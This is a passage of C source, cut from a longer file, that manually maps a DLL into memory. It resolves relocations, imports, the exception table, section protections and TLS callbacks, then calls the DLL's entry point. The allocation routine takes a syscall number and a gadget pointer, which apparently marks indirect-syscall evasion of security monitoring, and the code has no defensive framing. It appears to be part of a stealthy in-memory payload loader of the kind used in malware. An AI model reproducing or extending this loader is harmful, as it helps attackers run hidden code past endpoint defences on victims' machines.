    cbImage = StubAlignUp(pNt->OptionalHeader.SizeOfImage, 0x1000);
    pMapped = (PBYTE)StubAllocate(dwSsn, pGadget, cbImage, pNt->OptionalHeader.ImageBase);
    if (pMapped == NULL) return NULL;

    if (!StubCopyImage(pMapped, pDos, pNt)) return NULL;
    if (!StubRelocate(pMapped, pNt)) return NULL;
    if (!StubImports(pMapped, pNt, &ctx)) return NULL;
    if (!StubRegisterExceptionTable(pMapped, pNt, &ctx)) return NULL;
    if (!StubProtectSections(pMapped, pNt, &ctx)) return NULL;
    if (!StubTlsCallbacks(pMapped, pNt)) return NULL;

    if (pNt->OptionalHeader.AddressOfEntryPoint == 0) return pMapped;

    pfnEntry = (BOOL (WINAPI*)(HMODULE, DWORD, PVOID))(pMapped + pNt->OptionalHeader.AddressOfEntryPoint);
    if (!pfnEntry((HMODULE)pMapped, DLL_PROCESS_ATTACH, NULL)) return NULL;

    return pMapped;
}
